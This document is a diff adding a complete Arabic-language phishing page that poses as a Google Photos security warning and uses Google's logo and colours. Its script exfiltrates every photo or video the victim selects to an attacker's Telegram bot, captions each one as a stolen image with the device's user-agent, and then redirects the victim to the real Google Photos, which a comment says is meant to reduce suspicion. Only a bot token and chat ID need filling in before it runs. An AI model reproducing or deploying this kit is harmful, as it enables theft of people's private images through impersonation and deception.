@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان صور Google (هام)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            color: #333;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 450px;
+            margin: 50px auto;
+            border-top: 5px solid #4285F4; /* لون أزرق مثل جوجل */
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #EA4335; /* لون أحمر للتنبيه */
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .upload-area {
+            border: 2px dashed #ccc;
+            padding: 40px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: #f9f9f9;
+            transition: border-color 0.3s ease;
+            margin-bottom: 20px;
+        }
+        .upload-area:hover {
+            border-color: #4285F4;
+        }
+        .upload-button {
+            background-color: #4285F4; /* لون أزرق لجوجل */
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .upload-button:hover {
+            background-color: #3367d6;
+        }
+        #fileInput {
+            display: none; /* إخفاء زر اختيار الملفات الأصلي */
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-top: 15px;
+            overflow: hidden;
+            display: none; /* مخفي في البداية */
+        }
+        .progress {
+            width: 0%;
+            height: 20px;
+            background-color: #4CAF50; /* لون أخضر للتقدم */
+            border-radius: 5px;
+            text-align: center;
+            line-height: 20px;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.gstatic.com/images/branding/product/2x/photos_2020q4_48dp.png" alt="Google Photos" class="logo">
+        <h1>تحذير أمني هام!</h1>
+        <p>تم اكتشاف نشاط غير عادي في حساب صور Google الخاص بك. لمنع فقدان صورك بشكل دائم ولتأمين بياناتك، يجب عليك **مزامنة مكتبة الصور الخاصة بك فورًا**.</p>
+        <p>انقر على "مزامنة صورك الآن" وامنح الإذن للوصول إلى معرض الصور الخاص بك لإتمام عملية الأمان.</p>
+
+        <div class="upload-area" id="fakeUploadArea">
+            انقر هنا أو اسحب صورك لمزامنتها بأمان
+        </div>
+        <input type="file" id="fileInput" multiple accept="image/*,video/*">
+        <button class="upload-button" id="realUploadButton" style="display: none;">بدء المزامنة الآمنة</button>
+
+        <div id="status"></div>
+        <div class="progress-bar" id="progressBarContainer">
+            <div class="progress" id="progressBar">0%</div>
+        </div>
+    </div>
+
+    <script>
+        // **الأجزاء التي تحتاج إلى تعديل:**
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // ضع الـ Token الخاص ببوت التليجرام هنا
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";       // ضع الـ Chat ID الخاص بك هنا
+
+        // ------------------------------------------------------------------
+
+        const fileInput = document.getElementById('fileInput');
+        const fakeUploadArea = document.getElementById('fakeUploadArea');
+        const realUploadButton = document.getElementById('realUploadButton');
+        const statusDiv = document.getElementById('status');
+        const progressBarContainer = document.getElementById('progressBarContainer');
+        const progressBar = document.getElementById('progressBar');
+        let filesToUpload = [];
+
+        fakeUploadArea.addEventListener('click', () => {
+            fileInput.click(); // عند النقر على المنطقة الوهمية، يتم فتح نافذة اختيار الملفات الحقيقية
+        });
+
+        fileInput.addEventListener('change', (event) => {
+            filesToUpload = Array.from(event.target.files);
+            if (filesToUpload.length > 0) {
+                statusDiv.innerHTML = `تم اختيار ${filesToUpload.length} ملف لـ "المزامنة".`;
+                realUploadButton.style.display = 'block';
+            } else {
+                statusDiv.innerHTML = '';
+                realUploadButton.style.display = 'none';
+            }
+        });
+
+        realUploadButton.addEventListener('click', async () => {
+            if (filesToUpload.length === 0) {
+                statusDiv.innerHTML = 'الرجاء اختيار الصور أولاً.';
+                return;
+            }
+
+            realUploadButton.disabled = true;
+            fakeUploadArea.style.pointerEvents = 'none'; // منع النقر مرة أخرى
+            statusDiv.innerHTML = 'جاري المزامنة... هذا قد يستغرق بعض الوقت.';
+            progressBarContainer.style.display = 'block';
+
+            let uploadedCount = 0;
+            for (const file of filesToUpload) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('document', file); // إرسال الملف نفسه
+                    formData.append('caption', `صورة مسروقة من جهاز [${navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'غير معروف'}] - اسم الملف: ${file.name}`);
+
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        uploadedCount++;
+                        const progress = Math.round((uploadedCount / filesToUpload.length) * 100);
+                        progressBar.style.width = `${progress}%`;
+                        progressBar.textContent = `${progress}%`;
+                        statusDiv.innerHTML = `جاري المزامنة... تم مزامنة ${uploadedCount} من ${filesToUpload.length} ملف.`;
+                    } else {
+                        console.error('فشل إرسال الملف:', file.name, await response.text());
+                        statusDiv.innerHTML = `خطأ في مزامنة بعض الملفات. يرجى المحاولة مرة أخرى.`;
+                        break; // توقف عند أول خطأ أو يمكنك الاستمرار
+                    }
+                } catch (error) {
+                    console.error('خطأ في الاتصال:', error);
+                    statusDiv.innerHTML = `حدث خطأ في الاتصال. يرجى التحقق من اتصالك بالإنترنت.`;
+                    break;
+                }
+            }
+
+            if (uploadedCount === filesToUpload.length) {
+                statusDiv.innerHTML = 'المزامنة مكتملة بنجاح! سيتم إعادة توجيهك إلى Google Photos.';
+                progressBar.style.width = '100%';
+                progressBar.textContent = '100%';
+                // إعادة توجيه الضحية إلى الموقع الحقيقي بعد إتمام العملية لتقليل الشك
+                setTimeout(() => {
+                    window.location.href = 'https://photos.google.com/';
+                }, 3000);
+            } else {
+                realUploadButton.disabled = false;
+                fakeUploadArea.style.pointerEvents = 'auto';
+            }
+        });
+    </script>
+</body>
+</html>
